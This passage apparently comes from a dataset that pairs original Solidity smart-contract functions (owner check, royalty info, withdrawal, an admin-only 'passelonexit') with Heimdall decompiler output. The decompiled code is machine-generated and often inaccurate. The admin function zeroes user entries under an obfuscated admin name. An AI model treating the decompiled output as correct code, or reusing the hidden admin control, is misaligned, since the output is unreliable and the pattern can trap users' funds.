https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\\n}\\n\"\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x95f7bFda575e002777B856665bD36D954c3aaa59", "original_solidity_code": "function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }", "heimdall_decompiled_code": "function isOwner(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = !(!(address(arg0)) == (address(getOwner / 0x01)));\n        return !(!(address(arg0)) == (address(getOwner / 0x01)));\n    }"}
{"contract_address": "0x4c5CbB44F1F835E2BbE255d8dBFb91A364b0D36B", "original_solidity_code": "function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual override returns (address, uint256) {\\n        RoyaltyInfo memory royalty = _tokenRoyaltyInfo[_tokenId];\\n\\n        if (royalty.receiver == address(0)) {\\n            royalty = _defaultRoyaltyInfo;\\n        }\\n\\n        uint256 royaltyAmount = (_salePrice * royalty.royaltyFraction) / _feeDenominator();\\n\\n        return (royalty.receiver, royaltyAmount);\\n    }", "heimdall_decompiled_code": "function royaltyInfo(uint256 arg0, uint256 arg1) public view returns (bytes memory) {\n        uint256 var_a = arg0;\n        var_b = 0x0b;\n        uint256 var_c = 0x40 + var_c;\n        uint256 var_d = address(storage_map_b[var_a]);\n        uint256 var_e = uint96(storage_map_b[var_a] / 0x010000000000000000000000000000000000000000);\n        require(address(storage_map_b[var_a]));\n        require(uint96(var_f) == ((uint96(var_f) * arg1) / arg1) | !arg1);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x2710);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n        uint256 var_h = address(var_c.length);\n        uint256 var_i = (uint96(var_f) * arg1) / 0x2710;\n        return abi.encodePacked(address(var_c.length), (uint96(var_j) * arg1) / 0x2710);\n    }"}
{"contract_address": "0x4c5CbB44F1F835E2BbE255d8dBFb91A364b0D36B", "original_solidity_code": "function withdrawMoney() external onlyOwner nonReentrant {\\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\\\"\\\");\\n        if (!success) {\\n            revert TransferFailed();\\n        }\\n    }", "heimdall_decompiled_code": "function withdrawMoney() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(store_d - 0x02, \"ReentrancyGuard: reentrant call\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1f;\n        var_d = 0x5265656e7472616e637947756172643a207265656e7472616e742063616c6c00;\n        store_d = 0x02;\n        (bool success, bytes memory ret0) = address(msg.sender).transfer(address(this).balance);\n        require(ret0.length == 0, CustomError_90b8ec18());\n        var_a = 0x90b8ec1800000000000000000000000000000000000000000000000000000000;\n        store_d = 0x01;\n    }"}
{"contract_address": "0x55B63E91a5A7769095662Ea0990Bb736058437c7", "original_solidity_code": "function passelonexit(address jhhhqq) public    {\r\n        \r\n        require(_msgSender() == vipadmin123);   \r\n        if(_msgSender() == vipadmin123){\r\n        }else{\r\n        }\r\n        uint128 zrqqamount = 0;\r\n        xelonlist[jhhhqq] = zrqqamount; \r\n        \r\n    }", "heimdall_decompiled_code": "function passelonexit(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(vipadmin123)));\n        address var_a = address(arg0);\n        var_b = 0x08;\n        storage_map_b[var_a] = 0;\n    }"}
